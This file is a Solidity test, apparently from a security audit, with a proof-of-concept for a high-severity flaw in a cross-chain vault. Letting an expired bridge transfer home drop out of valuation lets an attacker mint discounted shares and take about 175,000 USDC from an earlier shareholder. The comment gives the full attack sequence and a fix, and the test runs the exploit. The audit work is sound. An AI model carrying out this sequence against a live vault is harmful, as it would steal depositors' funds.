// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {BridgeQuote, TransferKind} from "../../../src/interfaces/FundTypes.sol";
import {CrossChainFixture} from "./helpers/CrossChainFixture.sol";
import {SecAcrossSpokePool} from "./helpers/SecAcrossSpokePool.sol";

/// @title PoC: an expired transfer home sits in no value base until its refund, and anyone mints at the discount
/// @notice Finding (high). Lens: cross-chain messaging and bridging.
///
/// Root cause: `SpokeCrossChainLib._stillInFlight` drops a hub-bound transit from the report's `inFlightToHub` once
/// `fillDeadline + maxReportAge` has passed ("presumed filled", OQ-09 stance). When the deposit was in fact NOT filled,
/// the amount is neither in the spoke's Unallocated Balance (debited at the send) nor in the return leg the hub counts
/// (`CoreVaultLogic._returnLeg` reads only the latest report) nor in Idle, until the Across refund lands in the escrow
/// (55 to 90 minutes after the deadline from Robinhood, docs/DECISIONS.md) and `recognizeRefund` plus a new report
/// bring it back. For that window Share Assets, and so the Share Price every mint and burn uses, are understated by
/// the whole transfer, while mints stay open (the reports are fresh). DEC-104 is broken: recognized value is in no base.
///
/// Attack (call sequence):
/// 1. `SpokeVault.sendToHub(400,000 USDG, Principal, quote)` expires unfilled. This happens on its own whenever no
///    relayer serves USDG -> USDC (docs/INTEGRATIONS.md: route liveness is off-chain), and the manager can force it
///    inside the Mandate: `BridgeQuote.exclusiveRelayer` and `exclusivityDeadline` are passed to Across unchecked, so
///    an exclusive relayer that never fills blocks every other relayer until the fill deadline.
/// 2. After `fillDeadline + maxReportAge`, anyone calls `SpokeVault.report()` and delivers the VAA: the hub's Share
///    Assets fall from 997,050 to 597,250 USDC (-40%) although nothing was lost.
/// 3. The attacker calls `CoreVault.deposit(600,000 USDC)` at the depressed Share Price and receives about half of
///    all shares.
/// 4. The Across refund lands; anyone calls `SpokeVault.recognizeRefund`, `report()` and delivers: Share Assets are
///    whole again.
/// 5. The attacker exits with an Instant Payout and keeps about 180,000 USDC net of every fee; the earlier
///    Shareholder's shares lost about 200,000 USDC of value. A Shareholder who claims a Payout during the window is
///    underpaid by the same ratio.
///
/// Fix: a hub-bound transit must stay in a value base until its outcome is known. Keep it listed in `inFlightToHub`
/// until `recognizeRefund` (the hub already nets credited transits out, `amount - credited`), or have the hub keep
/// counting `listed - credited` of a transit the latest report dropped until a report shows the refund. Also bound
/// `exclusivityDeadline` (for instance reject exclusivity, or cap it to minutes) so the manager cannot force an expiry.
contract ExpiredSendHomeDiscountedMintPoC is CrossChainFixture {
    address internal managerRelayer = makeAddr("managerRelayer");

    function _spokeCap() internal pure override returns (uint256) {
        return 1_000_000e6;
    }

    function test_POC_expiredSendHomeDiscountedMint() public {
        // Alice funds the fund; the manager allocates half to Robinhood; a report confirms the arrival.
        _deposit(alice, 1_000_000e6);
        (, uint256 outboundDeposit) = _sendToSpoke(500_000e6, 499_750e6);
        _fillOnSpoke(outboundDeposit);
        _reportAndDeliver(900);
        assertEq(core.shareAssets(), 997_250e6);
        uint256 aliceShares = shares.balanceOf(alice);

        // 1. A transfer home that nobody fills. Forced here through the quote's exclusivity: the manager's own relayer
        //    is exclusive until the fill deadline and never fills.
        BridgeQuote memory quote = BridgeQuote({
            outputAmount: 399_800e6,
            quoteTimestamp: uint32(block.timestamp),
            exclusivityDeadline: FILL_DEADLINE,
            exclusiveRelayer: managerRelayer
        });
        (bytes32 homeTransit, uint256 homeDeposit) = _sendToHub(400_000e6, TransferKind.Principal, quote);
        SecAcrossSpokePool.Deposit memory d = spokePool.deposit(homeDeposit);
        vm.prank(relayer);
        vm.expectRevert(SecAcrossSpokePool.NotExclusiveRelayer.selector);
        hubPool.fillRelay(d);

        // While the transit is listed, the hub counts it as In-flight Value: nothing is missing.
        _reportAndDeliver(900);
        assertEq(core.shareAssets(), 997_050e6, "Idle 497,500 + spoke 99,750 + return leg 399,800");

        // 2. fillDeadline + maxReportAge passes: the spoke presumes the transit filled and stops listing it.
        vm.warp(uint256(d.fillDeadline) + MAX_REPORT_AGE + 1);
        _reportAndDeliver(900);
        assertEq(core.shareAssets(), 597_250e6, "the 400,000 USDG are in no base");
        assertEq(core.inFlightValue(), 0);

        // 3. The attacker mints at the depressed Share Price (the report is fresh, so the mint is open).
        (uint256 attackerShares, uint256 charged) = _deposit(attacker, 600_000e6);
        assertGt(attackerShares, aliceShares, "600,000 USDC bought more shares than Alice's 1,000,000 USDC");

        // 4. The Across refund lands in the escrow; anyone recognizes it and reports.
        skip(45 minutes);
        vm.chainId(SPOKE);
        spokePool.refundExpired(homeDeposit);
        spoke.recognizeRefund(homeTransit);
        vm.chainId(HUB);
        _reportAndDeliver(900);
        // Whole again, plus what the attacker's deposit added to Idle (the amount charged less the 1,500 USDC flow fee).
        assertEq(core.shareAssets(), 597_250e6 + 400_000e6 + charged - 1500e6, "whole again");

        // 5. The attacker exits with an Instant Payout, paying the 2% Payout Fee and the flow fee.
        uint256 attackerValue = attackerShares / 1e18 * core.sharePrice() / 1e18;
        vm.startPrank(attacker);
        core.requestPayout(attackerValue, ICoreVault.PayoutMode.Instant);
        core.claimPayout("");
        vm.stopPrank();

        uint256 profit = usdc.balanceOf(attacker) - 600_000e6;
        assertGt(profit, 175_000e6, "attacker's profit net of every fee");

        // Alice's 1,000,000 USDC of shares were worth 997,250 USDC before and are worth under 800,000 USDC now.
        uint256 aliceValue = aliceShares / 1e18 * core.sharePrice() / 1e18;
        assertLt(aliceValue, 800_000e6, "the discount was paid by the earlier Shareholder");
    }
}
